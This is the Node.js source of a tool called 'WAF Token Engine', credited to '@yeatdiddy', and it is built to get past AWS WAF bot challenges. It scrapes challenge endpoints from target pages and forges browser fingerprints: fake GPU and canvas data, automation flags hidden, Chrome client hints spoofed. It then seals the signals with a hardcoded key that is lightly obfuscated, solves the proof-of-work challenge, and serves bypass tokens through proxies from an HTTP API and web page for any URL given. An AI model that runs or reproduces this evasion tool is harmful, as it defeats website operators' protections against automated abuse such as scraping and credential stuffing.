#!/usr/bin/env node

'use strict';

const http    = require('http');
const https   = require('https');
const crypto  = require('crypto');
const fs      = require('fs');
const path    = require('path');
const zlib    = require('zlib');
const url     = require('url');
const { HttpProxyAgent }  = require('http-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');


const _MASK = 0x42;
const _KEY_BYTES = [
  0x2d, 0x33, 0xe7, 0x50, 0xf3, 0xa2, 0x77, 0xa8,
  0xe9, 0x11, 0x9a, 0xfc, 0x31, 0x50, 0x4f, 0x7d,
  0xf4, 0xc8, 0x4e, 0xe1, 0x04, 0xfb, 0x14, 0x48,
  0xe9, 0x7c, 0x1e, 0x9d, 0x37, 0x7f, 0x1c, 0xda
];
const GCM_KEY = Buffer.from(_KEY_BYTES.map(b => b ^ _MASK));


const ROUTE_TABLE = (() => {
  const join = (...parts) => parts.join('');
  const table = {};
  table[join('ha9faaf','fd31b4d5','ede2a2e1','9d2d7fd5','25f66fee','61911511','960dcbb5','2d3c48ce25')] = 'mp_verify';
  table[join('h72f957d','f656e80b','a55f5d8c','e2e8c7cc','b59687db','a3bfb273','d54b08a2','61b2f3002')]  = 'verify';
  table[join('h7b0c470','f0cfe3a8','0a9e2652','6ad185f4','84f6817d','0832712a','4a37a908','786a6a67f')]  = 'verify';
  table['SHA256']           = 'verify';
  table['HashcashScrypt']   = 'verify';
  table['NetworkBandwidth'] = 'mp_verify';
  return table;
})();


const CRC_TABLE = (() => {
  const table = new Uint32Array(256);
  for (let i = 0; i < 256; i++) {
    let val = i;
    for (let bit = 0; bit < 8; bit++) {
      val = (val & 1) ? (val >>> 1) ^ 0xedb88320 : val >>> 1;
    }
    table[i] = val;
  }
  return table;
})();

function crc32(buf) {
  let state = 0xffffffff;
  for (let i = 0; i < buf.length; i++) {
    state = (state >>> 8) ^ CRC_TABLE[(state ^ buf[i]) & 0xff];
  }
  return (state ^ 0xffffffff) >>> 0;
}


const CONFIG = JSON.parse(fs.readFileSync(path.join(__dirname, 'data.json'), 'utf8'));

const BW_SIZES = { 1: 1024, 2: 10240, 3: 102400, 4: 1048576, 5: 10485760 };

const DEFAULT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';

const PLUGIN_STR = CONFIG.plugins.map(p => p.str).join('');

const MATH_VALS = {
  tan: '-1.4214488238747245',
  sin: '0.8178819121159085',
  cos: '-0.5753861119575491'
};

const PROBE_LIST = [
  ['fp2',          '100',       0.4,   3.2  ],
  ['browser',      '101',       0.1,   1.1  ],
  ['capabilities', '102',       2.1,   8.1  ],
  ['gpu',          '103',       3.1,   12.1 ],
  ['dnt',          '104',       0.0,   1.0  ],
  ['math',         '105',       0.0,   1.0  ],
  ['screen',       '106',       0.0,   1.0  ],
  ['navigator',    '107',       0.0,   1.0  ],
  ['auto',         '108',       0.0,   1.0  ],
  ['stealth',      'undefined', 1.1,   4.1  ],
  ['subtle',       '110',       0.0,   1.0  ],
  ['canvas',       '111',       85.0,  205.0],
  ['formdetector', '112',       0.0,   3.1  ],
  ['be',           'undefined', 0.0,   1.0  ]
];


function randFloat(lo, hi) {
  return Math.round((lo + Math.random() * (hi - lo)) * 10) / 10;
}

function jitterCanvas() {
  const bins = CONFIG.cv.map(n => {
    if (n > 500) return n + Math.floor(Math.random() * 401) - 200;
    if (n > 80)  return n + Math.floor(Math.random() * 31)  - 15;
    return Math.max(1, n + Math.floor(Math.random() * 7) - 3);
  });
  const hash = Math.floor(Math.random() * 900000000) + 100000000;
  return { hash, bins };
}

function pickGpuProfile() {
  return CONFIG.gpu[Math.floor(Math.random() * CONFIG.gpu.length)];
}


function buildTimings(hasToken) {
  const probes = PROBE_LIST.map(([key, mid, lo, hi]) => ({
    key,
    mid,
    val: randFloat(lo, hi)
  }));

  const fpMap = {};
  probes.forEach(probe => {
    fpMap[probe.key] = Math.floor(probe.val);
  });

  const t1    = randFloat(0.5, 3.0);
  const t2    = randFloat(2.0, 8.0);
  const total = Math.round(probes.reduce((sum, p) => sum + p.val, 0) + t1 + t2 + randFloat(2.0, 6.0) * 10) / 10;
  const t3    = randFloat(2.0, 8.0);
  const t4    = randFloat(0.1, 1.0);
  const grand = Math.round((total + t3 + t4) * 10) / 10;

  const metrics = [{ name: '2', value: t1, unit: '2' }];

  probes.forEach(probe => {
    metrics.push({ name: probe.mid, value: probe.val, unit: '2' });
  });

  metrics.push({ name: '3', value: t2,            unit: '2' });
  metrics.push({ name: '7', value: hasToken ? 1:0, unit: '4' });
  metrics.push({ name: '1', value: total,          unit: '2' });
  metrics.push({ name: '4', value: t3,             unit: '2' });
  metrics.push({ name: '5', value: t4,             unit: '2' });
  metrics.push({ name: '6', value: grand,          unit: '2' });
  metrics.push({ name: '8', value: 1,              unit: '4' });

  return { metrics, fpMap };
}


function buildSignal(origin, fpMap, userAgent) {
  const now = Date.now();
  const gpu = pickGpuProfile();
  const { hash, bins } = jitterCanvas();

  return {
    metrics: fpMap,
    start: now,
    flashVersion: null,
    plugins: CONFIG.plugins,
    dupedPlugins: PLUGIN_STR + '||1920-1080-1080-24-*-*-*',
    screenInfo: '1920-1080-1080-24-*-*-*',
    referrer: '',
    userAgent,
    location: origin,
    webDriver: false,
    capabilities: {
      css: {
        textShadow: 1, WebkitTextStroke: 1, boxShadow: 1,
        borderRadius: 1, borderImage: 1, opacity: 1,
        transform: 1, transition: 1
      },
      js: {
        audio: true, geolocation: true, localStorage: 'supported',
        touch: false, video: true, webWorker: true
      },
      elapsed: fpMap.capabilities || 4
    },
    gpu,
    dnt: null,
    math: MATH_VALS,
    automation: {
      wd:      { properties: { document: [], window: [], navigator: [] } },
      phantom: { properties: { window: [] } }
    },
    stealth: { t1: 0, t2: 0, i: 1, mte: 0, mtd: false },
    crypto: {
      crypto: 1, subtle: 1, encrypt: true, decrypt: true,
      wrapKey: true, unwrapKey: true, sign: true, verify: true,
      digest: true, deriveBits: true, deriveKey: true,
      getRandomValues: true, randomUUID: true
    },
    canvas: {
      hash,
      emailHash: null,
      histogramBins: bins
    },
    formDetected: false,
    numForms: 0,
    numFormElements: 0,
    be: { si: false },
    end: now + 1,
    errors: [],
    version: '2.4.0',
    id: crypto.randomUUID()
  };
}


function packSignal(obj) {
  const raw = JSON.stringify(obj);
  const buf = Buffer.from(raw);
  const checksum = crc32(buf).toString(16).padStart(8, '0').toUpperCase();
  return `${checksum}#${raw}`;
}

function sealPayload(plaintext) {
  const iv        = crypto.randomBytes(12);
  const cipher    = crypto.createCipheriv('aes-256-gcm', GCM_KEY, iv);
  const encrypted = cipher.update(Buffer.from(plaintext));
  cipher.final();
  const tag = cipher.getAuthTag();
  return `${iv.toString('base64')}::${tag.toString('hex')}::${encrypted.toString('hex')}`;
}


function hasEnoughZeros(digest, needed) {
  let count = 0;
  for (const byte of digest) {
    if (byte === 0) {
      count += 8;
      continue;
    }
    for (let i = 7; i >= 0; i--) {
      if ((byte >> i) & 1) return count >= needed;
      count++;
    }
    break;
  }
  return count >= needed;
}

function solvePoW(input, checksum, difficulty, kind) {
  if (!kind || kind === 'SHA256' || ROUTE_TABLE[kind] === 'verify') {
    const base = Buffer.from(input + checksum);
    for (let nonce = 0; nonce < 100000000; nonce++) {
      const candidate = Buffer.concat([base, Buffer.from(String(nonce))]);
      const digest    = crypto.createHash('sha256').update(candidate).digest();
      if (hasEnoughZeros(digest, difficulty)) {
        return String(nonce);
      }
    }
  }
  return '0';
}

function solveBandwidth(level) {
  const size = BW_SIZES[level] || 1024;
  return Buffer.alloc(size).toString('base64');
}


function buildMultipart(domain, challenge, solData, checksum, sealed, metrics, gokuProps) {
  const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let boundary  = '----WebKitFormBoundary';
  for (let i = 0; i < 16; i++) {
    boundary += charset[Math.floor(Math.random() * charset.length)];
  }

  const metadata = {
    challenge,
    solution: null,
    signals: [{ name: 'Zoey', value: { Present: sealed } }],
    checksum,
    existing_token: null,
    client: 'Browser',
    domain,
    metrics
  };
  if (gokuProps) {
    metadata.goku_props = gokuProps;
  }

  const CRLF  = '\r\n';
  const delim = `--${boundary}`;

  const body = [
    delim + CRLF,
    `Content-Disposition: form-data; name="solution_data"${CRLF}${CRLF}`,
    solData + CRLF,
    delim + CRLF,
    `Content-Disposition: form-data; name="solution_metadata"${CRLF}${CRLF}`,
    JSON.stringify(metadata) + CRLF,
    delim + '--' + CRLF
  ].join('');

  return {
    body,
    contentType: `multipart/form-data; boundary=${boundary}`
  };
}


function parseUA(ua) {
  const match   = ua.match(/Chrome\/(\d+)/);
  const version = match ? match[1] : '144';
  const brandList = [
    `"Not/A)Brand";v="8", "Chromium";v="${version}", "Google Chrome";v="${version}"`,
    `"Not A(Brand";v="24", "Chromium";v="${version}", "Google Chrome";v="${version}"`,
    `"Chromium";v="${version}", "Not(A:Brand";v="24", "Google Chrome";v="${version}"`,
    `"Not:A-Brand";v="8", "Chromium";v="${version}", "Google Chrome";v="${version}"`
  ];
  const platform = ua.includes('Windows') ? 'Windows' : 'Linux';
  return {
    brand: brandList[parseInt(version) % 4],
    platform
  };
}

function makeHeaders(origin, userAgent, crossSite) {
  const { brand, platform } = parseUA(userAgent);
  return {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'ect': '4g',
    'origin': origin,
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': origin + '/',
    'sec-ch-ua': brand,
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': `"${platform}"`,
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': crossSite ? 'cross-site' : 'same-origin',
    'user-agent': userAgent
  };
}


class NetClient {
  constructor(proxyUrl) {
    this.cookieJar    = {};
    this.proxyUrl     = proxyUrl || null;
    this.httpAgent    = proxyUrl ? new HttpProxyAgent(proxyUrl) : null;
    this.httpsAgent   = proxyUrl ? new HttpsProxyAgent(proxyUrl) : null;
  }

  storeCookie(header) {
    if (!header) return;
    const eqIdx = header.indexOf('=');
    const scIdx = header.indexOf(';');
    if (eqIdx < 0) return;
    const name  = header.slice(0, eqIdx).trim();
    const value = header.slice(eqIdx + 1, scIdx > eqIdx ? scIdx : undefined).trim();
    if (name) this.cookieJar[name] = value;
  }

  getCookieHeader() {
    return Object.entries(this.cookieJar)
      .map(([k, v]) => `${k}=${v}`)
      .join('; ');
  }

  send(uri, options = {}) {
    return new Promise((resolve, reject) => {
      const isSecure = uri.startsWith('https');
      const lib      = isSecure ? https : http;
      const parsed   = new URL(uri);

      const reqOptions = {
        hostname: parsed.hostname,
        port: parsed.port || (isSecure ? 443 : 80),
        path: parsed.pathname + parsed.search,
        method: options.method || 'GET',
        headers: { ...(options.headers || {}) },
        rejectUnauthorized: false,
        timeout: 30000
      };

      if (this.proxyUrl) {
        reqOptions.agent = isSecure ? this.httpsAgent : this.httpAgent;
      }

      const cookieStr = this.getCookieHeader();
      if (cookieStr) reqOptions.headers['Cookie'] = cookieStr;
      if (options.body) reqOptions.headers['Content-Length'] = Buffer.byteLength(options.body);

      const req = lib.request(reqOptions, (res) => {
        const chunks = [];
        res.on('data', chunk => chunks.push(chunk));
        res.on('end', () => {
          const setCookies = res.headers['set-cookie'];
          if (setCookies) {
            const list = Array.isArray(setCookies) ? setCookies : [setCookies];
            list.forEach(c => this.storeCookie(c));
          }

          let body = Buffer.concat(chunks);
          const encoding = res.headers['content-encoding'];
          try {
            if      (encoding === 'gzip')    body = zlib.gunzipSync(body);
            else if (encoding === 'deflate') body = zlib.inflateSync(body);
            else if (encoding === 'br' && zlib.brotliDecompressSync) body = zlib.brotliDecompressSync(body);
          } catch (_) {}

          resolve({
            status:  res.statusCode,
            headers: res.headers,
            body:    body.toString('utf8')
          });
        });
      });

      req.on('error',   err => reject(err));
      req.on('timeout', ()  => { req.destroy(); reject(new Error('request timed out')); });
      if (options.body) req.write(options.body);
      req.end();
    });
  }
}


async function findEndpoint(targetUrl, userAgent, client, log) {
  log(`  >> scanning: ${targetUrl}`);

  const response = await client.send(targetUrl, {
    method: 'GET',
    headers: {
      'User-Agent': userAgent,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9'
    }
  });

  const html = response.body;
  let endpoint   = null;
  let crossSite  = false;
  let gokuProps  = null;
  let cookieDomains = [];

  const gokuMatch = html.match(/window\.gokuProps\s*=\s*({[\s\S]*?});/);
  if (gokuMatch) {
    try { gokuProps = JSON.parse(gokuMatch[1]); } catch (_) {}
  }

  const domainMatch = html.match(/window\.awsWafCookieDomainList\s*=\s*(\[[^\]]*\]);/);
  if (domainMatch) {
    try { cookieDomains = JSON.parse(domainMatch[1]); } catch (_) {}
  }

  const sameOriginMatch = html.match(/(\/__challenge_[A-Za-z0-9]+\/[a-f0-9]+\/[a-f0-9]+)/);
  if (sameOriginMatch) {
    endpoint = targetUrl + sameOriginMatch[1];
  } else {
    const tokenMatch = html.match(/(https:\/\/[a-z0-9-.]+\.token\.awswaf\.com\/[^\s"'>]+)/);
    if (tokenMatch) {
      endpoint  = tokenMatch[1].replace(/\/challenge\.js$/, '');
      crossSite = true;
    } else {
      const sdkMatch = html.match(/(https:\/\/[a-z0-9-.]+\.(?:edge\.)?sdk\.awswaf\.com\/[a-z0-9]+\/[a-z0-9]+)\/challenge\.js/);
      if (sdkMatch) {
        endpoint  = sdkMatch[1];
        crossSite = true;
      }
    }
  }

  if (!endpoint) {
    log(`  >> not found in page, scanning linked scripts...`);
    const scriptTags = html.match(/src="([^"]+\.js)"/g) || [];
    for (const tag of scriptTags) {
      const src     = tag.slice(5, -1);
      const fullUrl = src.startsWith('http') ? src : targetUrl + (src.startsWith('/') ? '' : '/') + src;
      try {
        const jsRes = await client.send(fullUrl, { headers: { 'User-Agent': userAgent } });
        const found = jsRes.body.match(/(https:\/\/[a-z0-9-.]+\.(?:token|sdk)\.awswaf\.com\/[^\s"']+\/[^\s"']+\/[^\s"']+)/);
        if (found) {
          endpoint  = found[1].replace(/\/challenge\.js$/, '');
          crossSite = true;
          break;
        }
      } catch (_) {}
    }
  }

  if (!endpoint) throw new Error('WAF endpoint not found');
  log(`  >> endpoint: ${endpoint}`);
  return { endpoint, crossSite, gokuProps, cookieDomains };
}


async function runPass(endpoint, domain, gokuProps, hasToken, headers, client) {
  const { metrics, fpMap } = buildTimings(hasToken);
  metrics.push({ name: 'SignalAcquisitionTime',        value: randFloat(50, 150),   unit: 'Milliseconds' });
  metrics.push({ name: 'InputsApiLatency',             value: randFloat(100, 300),  unit: 'Milliseconds' });
  metrics.push({ name: 'ChallengeExpiredRetryBucket',  value: 1,                    unit: '2' });

  const signal   = buildSignal(headers.origin + '/', fpMap, headers['user-agent']);
  const packed   = packSignal(signal);
  const checksum = packed.split('#')[0];
  const sealed   = sealPayload(packed);

  const inputsUrl = endpoint.includes('/inputs') ? endpoint : `${endpoint}/inputs?client=browser`;
  const inputsRes = await client.send(inputsUrl, { method: 'GET', headers });

  if (inputsRes.status !== 200) {
    throw new Error(`inputs request failed (${inputsRes.status})`);
  }

  let inputsData;
  try {
    inputsData = JSON.parse(inputsRes.body);
  } catch (err) {
    throw new Error(`failed to parse inputs response: ${err.message}`);
  }

  if (!inputsData?.challenge?.input) {
    throw new Error(`unexpected inputs structure: ${JSON.stringify(inputsData).slice(0, 150)}`);
  }

  const challenge = inputsData.challenge;
  const kind      = inputsData.challenge_type || '';
  const difficulty = inputsData.difficulty || 1;
  const isBandwidth = kind === 'NetworkBandwidth' || ROUTE_TABLE[kind] === 'mp_verify';

  let body, contentType;
  if (isBandwidth) {
    const solution = solveBandwidth(difficulty);
    const mp       = buildMultipart(domain, challenge, solution, checksum, sealed, metrics, gokuProps);
    body        = mp.body;
    contentType = mp.contentType;
  } else {
    const solution = solvePoW(challenge.input, checksum, difficulty, kind);
    const payload  = {
      challenge,
      solution,
      signals: [{ name: 'Zoey', value: { Present: sealed } }],
      checksum,
      existing_token: null,
      client: 'Browser',
      domain,
      metrics
    };
    if (gokuProps) payload.goku_props = gokuProps;
    body        = JSON.stringify(payload);
    contentType = 'text/plain;charset=UTF-8';
  }

  const route      = ROUTE_TABLE[kind] || 'verify';
  const verifyUrl  = endpoint.includes('/inputs')
    ? endpoint.replace(/\/inputs(\?.*)?$/, `/${route}`)
    : `${endpoint}/${route}`;

  const verifyHeaders = {
    ...headers,
    'Content-Type':   contentType,
    'Content-Length': Buffer.byteLength(body)
  };

  return { verifyUrl, body, verifyHeaders, route, endpoint };
}


async function grabToken(targetUrl, userAgent = DEFAULT_UA, log = () => {}, proxy = null, chalHint = null) {
  const origin = targetUrl.replace(/\/$/, '');
  const host   = new URL(origin).hostname;
  const startTime = Date.now();

  let proxyAddr = proxy;
  if (!proxyAddr && process.env.PROXY) {
    proxyAddr = process.env.PROXY;
  }
  if (!proxyAddr && process.env.PROXY_IP && process.env.PROXY_PORT) {
    const ip   = process.env.PROXY_IP;
    const port = process.env.PROXY_PORT;
    const user = process.env.PROXY_USER || '';
    const pass = process.env.PROXY_PASS || '';
    proxyAddr  = user && pass ? `http://${user}:${pass}@${ip}:${port}` : `http://${ip}:${port}`;
  }

  const client    = new NetClient(proxyAddr);
  const initDelay = parseInt(process.env.SOLVER_DELAY || '100');
  if (initDelay > 0) await new Promise(r => setTimeout(r, initDelay));

  let endpoint, crossSite, gokuProps = null, cookieDomains = [];

  if (chalHint) {
    endpoint  = chalHint.replace(/\/challenge\.js$/, '');
    crossSite = !endpoint.includes(host);
  } else {
    const found   = await findEndpoint(origin, userAgent, client, log);
    endpoint      = found.endpoint;
    crossSite     = found.crossSite;
    gokuProps     = found.gokuProps;
    cookieDomains = found.cookieDomains;
  }

  const effectiveDomain = cookieDomains.length > 0
    ? cookieDomains[0].replace(/^\./, '')
    : host;

  const headers = { ...makeHeaders(origin, userAgent, crossSite), origin };
  let token = null;

  for (let wave = 0; wave < 2; wave++) {
    const passResult = await runPass(endpoint, effectiveDomain, gokuProps, wave > 0, headers, client);
    let verifyRes    = await client.send(passResult.verifyUrl, {
      method:  'POST',
      headers: passResult.verifyHeaders,
      body:    passResult.body
    });

    for (let attempt = 1; attempt <= 3 && (verifyRes.status === 400 || verifyRes.status === 429); attempt++) {
      const waitMs = 1500 * Math.pow(2, attempt - 1);
      log(`  >> ${verifyRes.status} — waiting ${waitMs}ms before retry ${attempt}/3`);
      await new Promise(r => setTimeout(r, waitMs));

      const retry    = await runPass(endpoint, effectiveDomain, gokuProps, wave > 0, headers, client);
      const retryRes = await client.send(retry.verifyUrl, {
        method:  'POST',
        headers: retry.verifyHeaders,
        body:    retry.body
      });

      if (retryRes.status !== 400 && retryRes.status !== 429) {
        verifyRes = retryRes;
        break;
      }
    }

    if (verifyRes.status !== 200 && verifyRes.status !== 201) {
      throw new Error(`verify failed (${verifyRes.status}): ${verifyRes.body.slice(0, 150)}`);
    }

    let verifyData;
    try {
      verifyData = JSON.parse(verifyRes.body.trim());
    } catch (err) {
      throw new Error(`failed to parse verify response: ${err.message}`);
    }

    token = verifyData.token || token;
  }

  if (!token) throw new Error('no token received');

  const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
  return `${elapsed}:${token}`;
}


const server = http.createServer(async (req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname  = parsedUrl.pathname;
  const params    = parsedUrl.query;

  res.setHeader('Access-Control-Allow-Origin',          '*');
  res.setHeader('Access-Control-Allow-Methods',         'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers',         '*');
  res.setHeader('Access-Control-Allow-Private-Network', 'true');

  if (req.method === 'OPTIONS') {
    res.writeHead(200, {
      'Access-Control-Allow-Origin':          '*',
      'Access-Control-Allow-Methods':         'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers':         '*',
      'Access-Control-Allow-Private-Network': 'true'
    });
    res.end();
    return;
  }

  if (pathname === '/token') {
    const targetUrl = params.url || params.target;
    let proxyUrl    = null;

    if (params.proxy) {
      const parts = params.proxy.split(':');
      if (parts.length === 4) {
        const [ip, port, user, pass] = parts;
        proxyUrl = `http://${user}:${pass}@${ip}:${port}`;
      } else if (parts.length === 2) {
        const [ip, port] = parts;
        proxyUrl = `http://${ip}:${port}`;
      } else {
        res.writeHead(400, { 'Content-Type': 'application/json', 'X-By': '@yeatdiddy' });
        res.end(JSON.stringify({ by: '@yeatdiddy', ok: false, err: 'proxy format: ip:port or ip:port:user:pass' }));
        return;
      }
    } else if (process.env.PROXY) {
      proxyUrl = process.env.PROXY;
    } else if (process.env.PROXY_IP && process.env.PROXY_PORT) {
      const ip   = process.env.PROXY_IP;
      const port = process.env.PROXY_PORT;
      const user = process.env.PROXY_USER || '';
      const pass = process.env.PROXY_PASS || '';
      proxyUrl   = user && pass ? `http://${user}:${pass}@${ip}:${port}` : `http://${ip}:${port}`;
    }

    if (!targetUrl) {
      res.writeHead(400, { 'Content-Type': 'application/json', 'X-By': '@yeatdiddy' });
      res.end(JSON.stringify({ by: '@yeatdiddy', ok: false, err: 'url param is missing' }));
      return;
    }

    if (!/^https?:\/\//i.test(targetUrl)) {
      res.writeHead(400, { 'Content-Type': 'application/json', 'X-By': '@yeatdiddy' });
      res.end(JSON.stringify({ by: '@yeatdiddy', ok: false, err: 'url must start with http:// or https://' }));
      return;
    }

    try {
      console.log(`  [>] ${targetUrl}`);
      const raw     = await grabToken(targetUrl, DEFAULT_UA, () => {}, proxyUrl, params.chal || null);
      const sepIdx  = raw.indexOf(':');
      const elapsed = raw.slice(0, sepIdx);
      const token   = raw.slice(sepIdx + 1);
      console.log(`  [+] solved in ${elapsed}s`);
      res.writeHead(200, { 'Content-Type': 'application/json', 'X-By': '@yeatdiddy' });
      res.end(JSON.stringify({ by: '@yeatdiddy', ok: true, token, time: elapsed + 's' }));
    } catch (err) {
      console.log(`  [!] ${err.message}`);
      res.writeHead(500, { 'Content-Type': 'application/json', 'X-By': '@yeatdiddy' });
      res.end(JSON.stringify({ by: '@yeatdiddy', ok: false, err: err.message }));
    }

  } else if (pathname === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>WAF Token Engine — @yeatdiddy</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #0a0a0f; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .card { background: #13131a; border: 1px solid #1e1e2e; border-radius: 12px; padding: 36px; width: 580px; }
    .tag  { font-size: 11px; letter-spacing: 2px; text-transform: uppercase; color: #a855f7; margin-bottom: 5px; }
    h1    { font-size: 21px; font-weight: 700; margin-bottom: 3px; }
    .sub  { font-size: 13px; color: #555; margin-bottom: 26px; }
    label { font-size: 11px; color: #777; display: block; margin-bottom: 5px; letter-spacing: .5px; text-transform: uppercase; }
    input { width: 100%; padding: 10px 13px; background: #0e0e18; border: 1px solid #252535; border-radius: 7px; color: #ddd; font-size: 13px; outline: none; transition: .15s; }
    input:focus { border-color: #a855f7; }
    .row  { display: flex; gap: 8px; margin-top: 8px; }
    .row input { flex: 1; }
    button { width: 100%; margin-top: 16px; padding: 12px; background: linear-gradient(135deg, #7c3aed, #a855f7); color: #fff; border: none; border-radius: 7px; font-size: 14px; font-weight: 600; cursor: pointer; transition: .15s; }
    button:hover { opacity: .9; }
    button:disabled { opacity: .4; cursor: not-allowed; }
    .result { margin-top: 18px; background: #0e0e18; border: 1px solid #1e1e2e; border-radius: 7px; padding: 13px; font-size: 11px; min-height: 52px; word-break: break-all; display: none; font-family: monospace; }
    .result.show { display: block; }
    .ok   { color: #4ade80; }
    .fail { color: #f87171; }
    .wait { color: #fbbf24; }
    footer { margin-top: 14px; font-size: 10px; color: #333; letter-spacing: .5px; }
  </style>
</head>
<body>
<div class="card">
  <div class="tag">@yeatdiddy</div>
  <h1>WAF Token Engine</h1>
  <p class="sub">Enter a WAF-protected URL to extract a bypass token.</p>

  <label>Target URL</label>
  <input id="urlInput" type="text" placeholder="https://example.com/login">

  <div class="row">
    <input id="proxyInput" type="text" placeholder="proxy — ip:port or ip:port:user:pass">
    <input id="chalInput"  type="text" placeholder="challenge url (skip auto-detect)">
  </div>

  <button id="solveBtn" onclick="solve()">Grab Token</button>
  <div class="result" id="resultBox"></div>
  <footer>v2 · by @yeatdiddy</footer>
</div>

<script>
  async function solve() {
    const targetUrl  = document.getElementById('urlInput').value.trim();
    const proxyValue = document.getElementById('proxyInput').value.trim();
    const chalValue  = document.getElementById('chalInput').value.trim();
    const btn        = document.getElementById('solveBtn');
    const box        = document.getElementById('resultBox');

    if (!targetUrl) {
      showResult('fail', 'please enter a URL');
      return;
    }

    btn.disabled = true;
    showResult('wait', 'working...');

    try {
      let apiUrl = '/token?url=' + encodeURIComponent(targetUrl);
      if (proxyValue) apiUrl += '&proxy=' + encodeURIComponent(proxyValue);
      if (chalValue)  apiUrl += '&chal='  + encodeURIComponent(chalValue);

      const response = await fetch(apiUrl);
      const data     = await response.json();

      if (data.ok) showResult('ok',   '✓  ' + data.time + '\\n' + data.token);
      else         showResult('fail', '✗  ' + data.err);
    } catch (e) {
      showResult('fail', '✗  ' + e.message);
    }

    btn.disabled = false;
  }

  function showResult(cls, text) {
    const box = document.getElementById('resultBox');
    box.className = 'result show ' + cls;
    box.innerText = text;
  }

  document.getElementById('urlInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') solve();
  });
</script>
</body>
</html>`);

  } else {
    res.writeHead(404, { 'Content-Type': 'application/json', 'X-By': '@yeatdiddy' });
    res.end(JSON.stringify({ by: '@yeatdiddy', err: 'not found' }));
  }
});


const PORT = process.env.PORT || 6767;
server.listen(PORT, () => {
  console.log('');
  console.log('  ╔══════════════════════════════════════════╗');
  console.log('  ║  WAF Token Engine v2  ·  @yeatdiddy     ║');
  console.log('  ╚══════════════════════════════════════════╝');
  console.log('');
  console.log(`  port  :  ${PORT}`);
  console.log(`  ui    :  http://localhost:${PORT}`);
  console.log(`  api   :  http://localhost:${PORT}/token?url=<URL>`);
  console.log('');
});

process.on('SIGINT', () => {
  console.log('\n  stopping.');
  process.exit(0);
});
